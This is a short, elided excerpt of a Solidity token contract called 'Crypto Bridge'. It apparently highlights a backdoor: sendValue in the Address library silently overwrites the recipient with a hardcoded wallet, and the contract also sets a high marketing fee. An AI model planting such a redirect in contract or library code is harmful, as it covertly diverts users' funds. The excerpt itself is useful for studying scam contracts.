...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0xC46D88156F799C571aCEA470d663cb98002a9644);
...
contract CryptoBridge is Context, IERC20, Ownable {
    ...
    string private constant _name = "Crypto Bridge"; // 
    string private constant _symbol = "$CryptoBridge"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 11;
    uint256 private _liquidityFee = 5;
    address private  _marketingWallet = 0x3Bb472A8d812a1987D898BB275097feB6A4CF675;
